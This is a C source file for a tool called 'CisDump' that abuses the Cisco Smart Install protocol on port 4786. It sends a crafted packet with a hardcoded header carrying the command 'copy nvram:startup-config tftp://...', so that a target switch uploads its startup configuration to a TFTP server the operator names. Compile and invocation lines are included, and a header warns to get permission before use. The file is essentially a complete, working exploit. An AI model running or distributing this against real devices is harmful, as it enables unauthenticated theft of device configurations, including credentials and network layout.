/****************************************************************************************
 *                                                                                      *
 *     Cisco Smart Install - Startup Config Requestor v1.0                              *
 *                                                                                      *
 *     Developed by Andrew Borg  <andrew.borg@minerva.com.mt>                           *
 *                                                                                      *
 *     !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!               *
 *     !!!!!!!!!!!!!!!!!! Get Permission before use. !!!!!!!!!!!!!!!!!!!!               *
 *     !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!               *
 *                                                                                      *
 *     Tested on Arch 2022.01.01                                                        *
 *                                                                                      *
 *      Compilation Instructions:                                                       *
 *         $ gcc CisDump.c -o CisDump                                                   *
 *                                                                                      *
 *     Invocation:                                                                      *
 *         $ ./CisDump     Target IP        Port        TFTP Server                     *
 *         $ ./CisDump     127.0.0.1        4786         10.142.66.77                   *
 *                                                                                      *
 *                                                                                      *
 ****************************************************************************************/
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// Networking Includes: Sockets, Structures
//
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

typedef     uint8_t         BYTE;
typedef     uint16_t         WORD;
typedef     uint32_t         DWORD;


/* 
    Smart Install Protocol Structure.
    
    The First 40 Bytes appear to be a header. 
    Three Command Buffers (Command 1, Command 2, Command 3). Commands are held in a 336 byte buffer.
*/

struct SmartInstall {
    BYTE Head[40];
    BYTE Command1[336];
    BYTE Command2[336];
    BYTE Command3[336];
};

char isValidIP(char * IP) {
    struct sockaddr_in socketAddress;
    int result = inet_pton(AF_INET, IP, &(socketAddress.sin_addr));
    
    return result != 0;
}

struct SmartInstall GeneratePayload(char * TFTP, char * Target)
{
    struct SmartInstall Payload;
    
    memcpy(Payload.Head, "\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x04\x08\x00\x01\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\xfc\x99\x47\x37\x86\x60\x00\x00\x00\x03\x03\xf4", sizeof(Payload.Head));
    
    // First Command Must be Incorrect for this to Work. Not sure why, but it works..
    
    strncpy(Payload.Command1, "Beep Beep, Boop Boop", 10);
    
    snprintf(Payload.Command2, 336, "copy nvram:startup-config tftp://%s/%s.conf", TFTP, Target);
    
    return Payload;    
}

int ServerConnect (char * IP, short Port)
{
    int SocketDescriptor;
    struct sockaddr_in ServerAddress;
    memset(&ServerAddress, 0, sizeof(ServerAddress));

    SocketDescriptor         =    socket(AF_INET, SOCK_STREAM, 0);

    if (SocketDescriptor == -1)
            return -1;

    ServerAddress.sin_family         =    AF_INET;
    ServerAddress.sin_addr.s_addr    =    inet_addr(IP);
    ServerAddress.sin_port            =    htons(Port);

    if(connect(SocketDescriptor, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress)) != 0)
        return -1;
    else
        return SocketDescriptor;
}

void usage(char * filename) {
    printf("\r\n");
    
    puts("**********************************************************************");
    puts("* Cisco Smart Protocol - Startup Config Requestor v1.0 ***************");
    puts("**********************************************************************");
    
    puts("* This application will send a Cisco Smart Install Packet containing *");
    puts("* a request to copy the device's running configuration to the TFTP   *");
    puts("* server provided.                                                   *");
    puts("**********************************************************************");
    
    puts("Usage: "); 
    printf("\t%s <Target IP> <Target Port> <TFTP Server> \r\n", filename);    
    printf("\r\n");
}

int main(int argc, char * argv[]) {

    if (argc < 4)
    {
        usage(argv[0]);
        return 0;
    }
    
    int SocketDescriptor    =    ServerConnect(argv[1], atoi(argv[2]));
    
    if (SocketDescriptor     ==    -1) {
        puts("Error Connecting to the Server");
        return -1;
    }

    puts("Connected!");
    
    if (!isValidIP(argv[3])) {
        puts("Invalid TFTP Address provided");
        return -1;
    }
       
    struct SmartInstall Payload    =    GeneratePayload(argv[3], argv[1]);
    
    send (SocketDescriptor, (BYTE *)&Payload, sizeof(Payload), 0);
    
    printf("Payload Sent. Check the TFTP Server at %s\r\n", argv [3]);

}
